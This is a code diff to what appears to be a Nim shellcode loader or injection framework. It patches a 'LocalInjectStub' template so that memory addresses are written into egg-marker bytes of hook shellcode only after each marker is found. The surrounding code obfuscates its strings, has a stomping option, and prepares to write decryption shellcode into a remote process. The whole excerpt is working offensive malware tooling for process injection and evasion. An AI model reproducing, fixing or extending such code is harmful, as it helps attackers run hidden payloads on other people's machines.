@@ -444,15 +444,15 @@ let LocalInjectStub*  = """
                     when defined(verbose):
                         echo obf("[*] Found egg at index: "), i
                     eggIndex = i
+
+                    when defined(verbose):
+                        echo obf("[*] Writing allocated memory address into egg")
+
+                    copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr buffer, 8)
+
+                    when defined(verbose):
+                        echo obf("[*] Done.")
                     break
-
-            when defined(verbose):
-                echo obf("[*] Writing allocated memory address into egg")
-
-            copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr buffer, 8)
-
-            when defined(verbose):
-                echo obf("[*] Done.")
 
             # and we also want to replace the 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 with the address of the newly allocated memory address
 
@@ -469,12 +469,13 @@ let LocalInjectStub*  = """
                         echo obf("[*] Found egg at index: "), i
                     # our 0x00 bytes start at position three, so we need to add three to the index
                     eggIndex = i + 2
+
+                    when defined(verbose):
+                        echo obf("[*] Writing memory address into the jump at the end")
+
+                    copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr buffer, 8)
                     break
 
-            when defined(verbose):
-                echo obf("[*] Writing memory address into the jump at the end")
-
-            copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr buffer, 8)
 
             
             when defined(stomb):
@@ -489,11 +490,12 @@ let LocalInjectStub*  = """
                         when defined(verbose):
                             echo obf("[*] Found egg at index: "), i
                         eggIndex = i
+
+                        when defined(verbose):
+                            echo obf("[*] Writing memory address into the egg "), repr(protectedAddress)
+                        copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr protectedAddress, 8)
                         break
 
-                when defined(verbose):
-                    echo obf("[*] Writing memory address into the egg "), repr(protectedAddress)
-                copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr protectedAddress, 8)
 
             # Finally write the decryptprotect.bin shellcode into the remote process
             
